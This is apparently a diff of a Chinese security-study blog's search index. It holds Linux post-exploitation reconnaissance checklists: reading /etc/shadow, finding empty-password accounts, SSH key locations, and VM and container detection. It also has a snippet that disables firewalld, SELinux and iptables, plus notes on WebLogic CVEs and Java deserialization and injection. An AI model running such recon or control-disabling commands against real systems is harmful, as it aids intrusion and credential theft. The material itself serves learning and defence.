class="built_in">pwd</span></span><br><span class="line">显示默认系统遍历 <span class="built_in">cat</span> /etc/profile</span><br><span class="line">显示可用的shell <span class="built_in">cat</span> /etc/shells</span><br><span class="line">6.2.1.5. 进程信息</span><br><span class="line">查看进程信息 ps aux</span><br><span class="line">资源占有情况 top -c</span><br><span class="line">查看进程关联文件 lsof -c <span class="variable">$PID</span></span><br><span class="line">完整命令行信息 /proc/<span class="variable">$PID</span>/cmdline</span><br><span class="line">进程的命令名 /proc/<span class="variable">$PID</span>/comm</span><br><span class="line">进程当前工作目录的符号链接 /proc/<span class="variable">$PID</span>/cwd</span><br><span class="line">运行程序的符号链接 /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">进程的环境变量 /proc/<span class="variable">$PID</span>/environ</span><br><span class="line">进程打开文件的情况 /proc/<span class="variable">$PID</span>/fd</span><br><span class="line">6.2.1.6. 服务信息</span><br><span class="line">由inetd管理的服务列表 <span class="built_in">cat</span> /etc/inetd.conf</span><br><span class="line">由xinetd管理的服务列表 <span class="built_in">cat</span> /etc/xinetd.conf</span><br><span class="line">nfs服务器的配置 <span class="built_in">cat</span> /etc/exports</span><br><span class="line">邮件信息 /var/log/mailog</span><br><span class="line">ssh配置 sshd_config</span><br><span class="line">6.2.1.7. 计划任务</span><br><span class="line">显示指定用户的计划作业（root） crontab -l -u %user%</span><br><span class="line">计划任务</span><br><span class="line">/var/spool/cron/*</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/cron.*</span><br><span class="line">/etc/anacrontab</span><br><span class="line">开机启动项</span><br><span class="line">/etc/rc.d/init.d/</span><br><span class="line">6.2.1.8. 网络、路由和通信</span><br><span class="line">列出网络接口信息 /sbin/ifconfig -a / ip addr show</span><br><span class="line">列出网络接口信息 <span class="built_in">cat</span> /etc/network/interfaces</span><br><span class="line">查看系统arp表 arp -a</span><br><span class="line">打印路由信息 route / ip ro show</span><br><span class="line">查看dns配置信息 <span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line">打印本地端口开放信息 netstat -an</span><br><span class="line">列出iptable的配置规则 iptables -L</span><br><span class="line">查看端口服务映射 <span class="built_in">cat</span> /etc/services</span><br><span class="line">Hostname hostname -f</span><br><span class="line">查看进程端口情况 netstat -anltp | grep <span class="variable">$PID</span></span><br><span class="line">6.2.1.9. 已安装程序</span><br><span class="line">rpm -qa --last Redhat</span><br><span class="line">yum list | grep installed CentOS</span><br><span class="line"><span class="built_in">ls</span> -l /etc/yum.repos.d/</span><br><span class="line">dpkg -l Debian</span><br><span class="line"><span class="built_in">cat</span> /etc/apt/sources.list Debian APT</span><br><span class="line">pkg_info xBSD</span><br><span class="line">pkginfo Solaris</span><br><span class="line">pacman -Q Arch Linux</span><br><span class="line">emerge Gentoo</span><br><span class="line">6.2.1.10. 文件</span><br><span class="line">最近五天的文件 find / -ctime +1 -ctime -5</span><br><span class="line">文件系统细节 debugfs</span><br><span class="line">6.2.1.11. 公私钥信息</span><br><span class="line">~/.ssh</span><br><span class="line">/etc/ssh</span><br><span class="line">6.2.1.12. 日志</span><br><span class="line">/var/log/boot.log</span><br><span class="line">/var/log/cron</span><br><span class="line">/var/log/faillog</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/run/utmp</span><br><span class="line">6.2.1.13. 虚拟环境检测</span><br><span class="line">lsmod | grep -i <span class="string">&quot;vboxsf\|vboxguest&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;vmw_baloon\|vmxnet&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;xen-vbd\|xen-vnif&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;virtio_pci\|virtio_net&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</span></span><br><span class="line">6.2.1.14. 容器内信息收集</span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br><span class="line"><span class="built_in">env</span> | grep KUBE</span><br><span class="line"><span class="built_in">ls</span> -l .dockerenv</span><br><span class="line"><span class="built_in">ls</span> -l /run/secrets/Kubernetes.io/</span><br><span class="line">mount</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#乱码</span></span><br><span class="line">chcp 65001</span><br><span class="line"><span class="comment">#切换账户到admin</span></span><br><span class="line">su -l admin </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建账户</span></span><br><span class="line">useradd   name  </span><br><span class="line">passwd   name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态网卡</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eno</span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="comment">#关闭防火墙和临时禁用selinux安全模块</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">setenforce 0</span><br><span class="line"><span class="comment">#清空防火墙规则</span></span><br><span class="line">iptables -F</span><br><span class="line">获取内核，操作系统和设备信息</span><br><span class="line">版本信息</span><br><span class="line"><span class="built_in">uname</span> -a 所有版本</span><br><span class="line"><span class="built_in">uname</span> -r 内核版本信息</span><br><span class="line"><span class="built_in">uname</span> -n 系统主机名字</span><br><span class="line"><span class="built_in">uname</span> -m Linux内核架构</span><br><span class="line">内核信息 <span class="built_in">cat</span> /proc/version</span><br><span class="line">CPU信息 <span class="built_in">cat</span> /proc/cpuinfo</span><br><span class="line">发布信息</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line">主机名 hostname</span><br><span class="line">文件系统 <span class="built_in">df</span> -a</span><br><span class="line">内核日志 dmesg / /var/log/dmesg</span><br><span class="line">6.2.1.2. 用户和组</span><br><span class="line">列出系统所有用户 <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">列出系统所有组 <span class="built_in">cat</span> /etc/group</span><br><span class="line">列出所有用户<span class="built_in">hash</span>（root）``<span class="built_in">cat</span> /etc/shadow``</span><br><span class="line">用户</span><br><span class="line">查询用户的基本信息 finger</span><br><span class="line">当前登录的用户 <span class="built_in">users</span> <span class="built_in">who</span> -a /var/log/utmp</span><br><span class="line">查询无密码用户 grep <span class="string">&#x27;x:0:&#x27;</span> /etc/passwd</span><br><span class="line">目前登录的用户 w</span><br><span class="line">登入过的用户信息 last / /var/log/wtmp</span><br><span class="line">显示系统中所有用户最近一次登录信息 lastlog / /var/log/lastlog</span><br><span class="line">登录成功日志 /var/log/secure</span><br><span class="line">登录失败日志 /var/log/faillog</span><br><span class="line">查看特权用户 grep :0 /etc/passwd</span><br><span class="line">查看passwd最后修改时间 <span class="built_in">ls</span> -l /etc/passwd</span><br><span class="line">查看是否存在空口令用户 awk -F: <span class="string">&#x27;length($2)==0 &#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看远程登录的账号 awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看具有sudo权限的用户</span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br><span class="line">6.2.1.3. 用户和权限信息</span><br><span class="line">当前用户 <span class="built_in">whoami</span></span><br><span class="line">当前用户信息 <span class="built_in">id</span></span><br><span class="line">可以使用sudo提升到root的用户（root） <span class="built_in">cat</span> /etc/sudoers</span><br><span class="line">列出目前用户可执行与无法执行的指令 sudo -l</span><br><span class="line">6.2.1.4. 环境信息</span><br><span class="line">打印系统环境信息 <span class="built_in">env</span></span><br><span class="line">打印系统环境信息 <span class="built_in">set</span></span><br><span class="line">环境变量中的路径信息 <span class="built_in">echo</span>  <span class="variable">$PATH</span></span><br><span class="line">打印历史命令 <span class="built_in">history</span> / ~/.bash_history</span><br><span class="line">显示当前路径 <span class="built_in">pwd</span></span><br><span class="line">显示默认系统遍历 <span class="built_in">cat</span> /etc/profile</span><br><span class="line">显示可用的shell <span class="built_in">cat</span> /etc/shells</span><br><span class="line">6.2.1.5. 进程信息</span><br><span class="line">查看进程信息 ps aux</span><br><span class="line">资源占有情况 top -c</span><br><span class="line">查看进程关联文件 lsof -c <span class="variable">$PID</span></span><br><span class="line">完整命令行信息 /proc/<span class="variable">$PID</span>/cmdline</span><br><span class="line">进程的命令名 /proc/<span class="variable">$PID</span>/comm</span><br><span class="line">进程当前工作目录的符号链接 /proc/<span class="variable">$PID</span>/cwd</span><br><span class="line">运行程序的符号链接 /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">进程的环境变量 /proc/<span class="variable">$PID</span>/environ</span><br><span class="line">进程打开文件的情况 /proc/<span class="variable">$PID</span>/fd</span><br><span class="line">6.2.1.6. 服务信息</span><br><span class="line">由inetd管理的服务列表 <span class="built_in">cat</span> /etc/inetd.conf</span><br><span class="line">由xinetd管理的服务列表 <span class="built_in">cat</span> /etc/xinetd.conf</span><br><span class="line">nfs服务器的配置 <span class="built_in">cat</span> /etc/exports</span><br><span class="line">邮件信息 /var/log/mailog</span><br><span class="line">ssh配置 sshd_config</span><br><span class="line">6.2.1.7. 计划任务</span><br><span class="line">显示指定用户的计划作业（root） crontab -l -u %user%</span><br><span class="line">计划任务</span><br><span class="line">/var/spool/cron/*</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/cron.*</span><br><span class="line">/etc/anacrontab</span><br><span class="line">开机启动项</span><br><span class="line">/etc/rc.d/init.d/</span><br><span class="line">6.2.1.8. 网络、路由和通信</span><br><span class="line">列出网络接口信息 /sbin/ifconfig -a / ip addr show</span><br><span class="line">列出网络接口信息 <span class="built_in">cat</span> /etc/network/interfaces</span><br><span class="line">查看系统arp表 arp -a</span><br><span class="line">打印路由信息 route / ip ro show</span><br><span class="line">查看dns配置信息 <span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line">打印本地端口开放信息 netstat -an</span><br><span class="line">列出iptable的配置规则 iptables -L</span><br><span class="line">查看端口服务映射 <span class="built_in">cat</span> /etc/services</span><br><span class="line">Hostname hostname -f</span><br><span class="line">查看进程端口情况 netstat -anltp | grep <span class="variable">$PID</span></span><br><span class="line">6.2.1.9. 已安装程序</span><br><span class="line">rpm -qa --last Redhat</span><br><span class="line">yum list | grep installed CentOS</span><br><span class="line"><span class="built_in">ls</span> -l /etc/yum.repos.d/</span><br><span class="line">dpkg -l Debian</span><br><span class="line"><span class="built_in">cat</span> /etc/apt/sources.list Debian APT</span><br><span class="line">pkg_info xBSD</span><br><span class="line">pkginfo Solaris</span><br><span class="line">pacman -Q Arch Linux</span><br><span class="line">emerge Gentoo</span><br><span class="line">6.2.1.10. 文件</span><br><span class="line">最近五天的文件 find / -ctime +1 -ctime -5</span><br><span class="line">文件系统细节 debugfs</span><br><span class="line">6.2.1.11. 公私钥信息</span><br><span class="line">~/.ssh</span><br><span class="line">/etc/ssh</span><br><span class="line">6.2.1.12. 日志</span><br><span class="line">/var/log/boot.log</span><br><span class="line">/var/log/cron</span><br><span class="line">/var/log/faillog</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/run/utmp</span><br><span class="line">6.2.1.13. 虚拟环境检测</span><br><span class="line">lsmod | grep -i <span class="string">&quot;vboxsf\|vboxguest&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;vmw_baloon\|vmxnet&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;xen-vbd\|xen-vnif&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;virtio_pci\|virtio_net&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</span></span><br><span class="line">6.2.1.14. 容器内信息收集</span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br><span class="line"><span class="built_in">env</span> | grep KUBE</span><br><span class="line"><span class="built_in">ls</span> -l .dockerenv</span><br><span class="line"><span class="built_in">ls</span> -l /run/secrets/Kubernetes.io/</span><br><span class="line">mount</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure>
 
 
 
@@ -705,7 +817,18 @@
 <h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>方法一   ： nmap -n -v -p 7001 127.0.0.1 –script weblogic-t3-info</p>
 <p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230625050146188.png" alt="image-20230625050146188"></p>
 <p>基于weblogic t3 协议引起远程代码执行的反序列化，属于weblogic JRMP反序列化</p>
-<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><h4 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h4><p>访问<a href="http://your-ip:7001/ws_utc/config.do">http://your-ip:7001/ws_utc/config.do</a> ，上传，返回包里有时间戳，一会会作为文件名使用</p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h4><blockquote>
+<p>由于Weblogic  t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。weblogic.deployment.jms.ForeignOpaqueReference继承自OpaqueReference并且实现了getReferent方法，并且存在retVal &#x3D; context.lookup(this.remoteJNDIName)实现，故可以通过rmi&#x2F;ldap远程协议进行远程命令执行</p>
+</blockquote>
+<p><a href="https://xz.aliyun.com/t/12297">https://xz.aliyun.com/t/12297</a></p>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><ul>
+<li>WebLogic_Server &#x3D; 12.2.1.3.0</li>
+<li>WebLogic_Server &#x3D; 12.2.1.4.0</li>
+<li>WebLogic_Server &#x3D; 14.1.1.0.0</li>
+</ul>
+<p>poc构造</p>
+<p>使用main方法创建了一个getInitialContext方法并使用getInitialContext方法，创建初始上下文并使用T3协议与WebLogic服务器连接，然后创建了一个weblogic.deployment.jms.ForeignOpaqueReference类的实例并通过反射机制访问私有字段以设置远程JNDI名称，并将其绑定到WebLogic服务器上的”bind”命名对象,导致命令执行漏洞。</p>
+<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><h4 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h4><p>访问<a href="http://your-ip:7001/ws_utc/config.do">http://your-ip:7001/ws_utc/config.do</a> ，上传，返回包里有时间戳，一会会作为文件名使用</p>
 <p>访问<a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
 <h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><p>设置config.do页面登陆授权后访问</p>
 <p>ips等防御产品可加入相应的特征</p>
@@ -745,7 +868,7 @@
 <p>weblogic密码使用AES加密，只需要找到用户的密文和加密是的密钥</p>
 <p>这两个文件均位于base_domain下，名为serializedSystemIni.dat和config.xml</p>
 <p>在本环境中为.&#x2F;security&#x2F;serializedSystemIni.dat和.&#x2F;config&#x2F;config&#x2F;xml</p>
-<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="cve-2014-4210"><a href="#cve-2014-4210" class="headerlink" title="cve-2014-4210"></a>cve-2014-4210</h4><h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>10.0.2</p>
+<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="cve-2014-4210"><a href="#cve-2014-4210" class="headerlink" title="cve-2014-4210"></a>cve-2014-4210</h4><h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><p>10.0.2</p>
 <p>10.3.6</p>
 <h5 id="漏洞地址-1"><a href="#漏洞地址-1" class="headerlink" title="漏洞地址"></a>漏洞地址</h5><p><a href="http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp">http://ip:7001/uddiexplorer/SearchPublicRegistries.jsp</a></p>
 <p>提交的时候 operator参数可控，存在ssrf</p>
@@ -758,27 +881,16 @@
       </tags>
   </entry>
   <entry>
-    <title>反序列化</title>
+    <title>java反序列化</title>
     <url>/2023/06/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<p>漏洞介绍</p>
 <p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中;反序列化即逆过程，由字节流还原成对象。</p>
 <p>Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectlnputStream类的readobject()方法用于反序列化。</p>
-<p>分析反序列化</p>
-<p>java反序列化漏洞</p>
-<p>关于防御</p>
-]]></content>
-      <tags>
-        <tag>java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>学习计划</title>
-    <url>/2023/06/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<p>反序列化入门</p>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>反序列化入门</p>
 <p><a href="https://blog.csdn.net/weixin_45808483/article/details/122545168">https://blog.csdn.net/weixin_45808483/article/details/122545168</a></p>
 <p><a href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
 <p>被transient修饰过的变量不能被序列化，因为serialization是吧对象的状态存储到硬盘上，而有些敏感信息，例如银行卡号，是不希望在网络上传输的，transient的作用就是，吧这个变量的生命周期只存在内存中，而不会写到磁盘持久化</p>
-<p>Externalizable接口</p>
+<p><strong>Externalizable</strong>接口</p>
 <p>需要重写writeExternal和readExternal方法，它的效率比Serializable高一些，并且可以决定哪些属性需要序列化（即使是transient修饰的），但是对大量对象，或者重复对象，则效率低</p>
 <p>java中自带序列化的类 ， map    hashmap   ，hashmap是重写writeobject和readobject方法的，</p>
 <blockquote>
@@ -786,66 +898,157 @@
 </blockquote>
 <p>yeoserial构造复杂反序列化链</p>
 <p><a href="https://www.bilibili.com/video/BV115411K7MX/?spm_id_from=333.337.search-card.all.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV115411K7MX/?spm_id_from=333.337.search-card.all.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
+<p><strong>javaEE的核心技术</strong>有：JDBC、JNDI、RMI、EJB、Servlet、JSP、XML、JMS、Java IDL、JTS、JTA、JavaMail 和 JAF</p>
+<p><strong>MVC</strong>的工作流程：Controller 层接收用户的请求，并决定应该调用哪个 Model 来进行处理；然后，由 Model 使用逻辑处理用户的请求并返回数<br>据；最后，返回的数据通过 View 层呈现给用户</p>
+<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a><strong>动态代理</strong></h4><blockquote>
+<p>通过动态代理可以实现多个需求，</p>
+<p>静态代理不易于项目维护，会造成冗余，</p>
+</blockquote>
+<p>动态代理是通过实现接口的方式来实现代理，通过proxy类创建代理对象，然后将接口方法’代理‘给InvocationHandler接口完成的（实现InvocationHandler需要重写	invoke方法）</p>
+<p><strong>CGLib</strong></p>
+<blockquote>
+<p>动态代理基于反射机制实现的，必须实现接口的业务类才能使用这种办法生成代理对象，只能基于接口设计，对于没有接口的情况，JDK方式无法解决，而CGLib采用非常底层的字节码技术，性能也表现不错</p>
+</blockquote>
+<p>一个第三方代码生成类库，基于asm机制实现的，通过实现生成业务类的子类作为代理类</p>
+<p><strong>javassist动态编程</strong></p>
+<p>静态编程的类型检查是在编译时完成的，对于动态编程来说，类型检查是在运行时完成的 ，因此所谓的动态编程就是绕过编译过程在运行时进行操作的技术</p>
+<h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><p>loadClass()方法只对类进行加载，不会对类进行初始化。Class.forName 会默认对<br>类进行初始化(初始化就是静态代码块会执行)</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> person.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从原型class实例化对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取类里面的属性</span></span><br><span class="line">        <span class="comment">//getFields不能打印private</span></span><br><span class="line"><span class="comment">//        Field[] personfields = c.getDeclaredFields();</span></span><br><span class="line"><span class="comment">//        for (Field f : personfields) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(f);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line"><span class="comment">//        调用类里面的方法</span></span><br><span class="line"><span class="comment">//        Method[] personmethods = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m : personmethods) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">actionmethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">        actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        actionmethod.invoke(p,<span class="string">&quot;asdasd&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>参数化查询，预编译</p>
+<p><strong>mybatis</strong></p>
+<p>#和$的区别，MyBatis 中使用 parameterType 向 SQL 语句传参，在 SQL 引用传参可以使用<br>#{Parameter}和${Parameter}两种方式。</p>
+<p>#会用？传参， $会用单引号拼接传参，导致注入产生</p>
+<p><strong>Hibernate 框架</strong></p>
+<blockquote>
+<p>Hibernate 是对持久化类的对象进行操作而不是直接对数据库进行操作，因此 HQL 查询语句由 Hibernate 引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自 Hibernate 引擎</p>
+</blockquote>
+<p>避免注入的几种参数绑定方式</p>
+<p>位置参数()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String parameter = &quot;z1ng&quot;;</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.Userwhere name</span><br><span class="line">= ?1&quot;, User.class);</span><br><span class="line">query.setParameter(1, parameter);</span><br></pre></td></tr></table></figure>
+
+<p>命名参数()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.Userwhere name</span><br><span class="line">= ?1&quot;, User.class);String parameter = &quot;z1ng&quot;;</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.Userwhere name</span><br><span class="line">= :name&quot;, User.class);</span><br><span class="line">query.setParameter(&quot;name&quot;, parameter);</span><br></pre></td></tr></table></figure>
+
+<p>命名参数列表()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; names = Arrays.asList(&quot;z1ng&quot;, &quot;z2ng&quot;);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.User where name in</span><br><span class="line">(:names)&quot;, User.class);</span><br><span class="line">query.setParameter(&quot;names&quot;, names);</span><br></pre></td></tr></table></figure>
+
+<p>类实例(JavaBean)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user1.setName(&quot;z1ng&quot;);</span><br><span class="line">Query&lt;User&gt; query = session.createQuery(&quot;from com.z1ng.bean.User where name</span><br><span class="line">=:name&quot;, User.class);</span><br><span class="line">query.setProperties(user1);</span><br></pre></td></tr></table></figure>
+
+<p>hibernate支持原生的SQL语句，应采用参数绑定的方式构造语句</p>
+<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a><strong>命令注入</strong></h4><h4 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h4><p>与命令注入相比，代码注入更具有灵活性，例如在cc链中，反序列化直接用runtime.getruntime().exec()执行系统命令是没有回显的，一种思路是通过URLloader远程加载类文件以及异常处理机制构造出可以回显的利用方式，具体步骤如下：</p>
+<p>首先构造一个恶意代码类，编译成jar包放置在远程服务器上，然后利用cc链反序列化漏洞可以注入任意代码的特点，构造poc，可以发现系统执行了whoami命令</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718100605797.png" alt="image-20230718100605797"></p>
+<h4 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h4><blockquote>
+<p>最早出现于2012年12月的一篇论文中，文中详细阐述的表达式注入产生的原因和危害，例如struts的OGNL表达式引起的远程代码执行</p>
+</blockquote>
+<h5 id="EL表达式基础"><a href="#EL表达式基础" class="headerlink" title="EL表达式基础"></a><strong>EL表达式</strong>基础</h5><p>主要功能：</p>
+<ul>
+<li><p>获取数据：可以从jsp的四大作用域（page，request,session，application）中获取数据</p>
+</li>
+<li><p>执行运算：在jsp页面执行一些简单的逻辑运算，关系运算，算术运算</p>
+</li>
+<li><p>获取web开发常用对象：EL表达式内置了11个隐式对象，开发者可以通过这类隐式对象，获得想要的数据</p>
+</li>
+<li><p>调用java方法：EL表达式允许用户开发自定义EL函数，以及在jsp页面通过el表达式调用java类的方法</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718104846464.png" alt="image-20230718104846464"></p>
+</li>
+</ul>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718104858646.png" alt="image-20230718104858646"></p>
+<h5 id="EL基础语法"><a href="#EL基础语法" class="headerlink" title="EL基础语法"></a>EL基础语法</h5><p>在 JSP 中，用户可以使用<code>$&#123;&#125;</code>来表示此处为 EL 表达式，例如，表达式<code>$&#123; name &#125;</code>表示获取<code>name</code>变量。当 EL 表达式未指定作用域范围时，默认在 page 作用域范围查找，而后依次在 request、session、application 范围查找,也可以使用作用域作为前缀找，表达式<code>$&#123; requestScope.name&#125;</code>表示在 request 作用域范围中获取“name”变量</p>
+<p><strong>获取对象属性的两种方式</strong></p>
+<ul>
+<li><p>第一种格式为${对象.属性}，例如：${param.name}</p>
+</li>
+<li><p>第二种为使用“[]”符号，例如：${param[name]}</p>
+</li>
+</ul>
+<p>当属性名中存在特殊字符或者属性名是一个变量时，则需要使用<code>[]</code>符号的方式获取属性，例如：${User[“Login-Flag”]}和${User[data]}</p>
+<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a><strong>案例</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL 表达式实例页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">        &lt;h3&gt; 输入的 name 值为：$&#123;param.name&#125;&lt;/h3&gt;</span><br><span class="line">    &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url访问index.jsp?name&#x3D;zhhhy时，</p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230718105831460.png" alt="image-20230718105831460"></p>
+<p>也可以实例化java的内置类，如runtime.class</p>
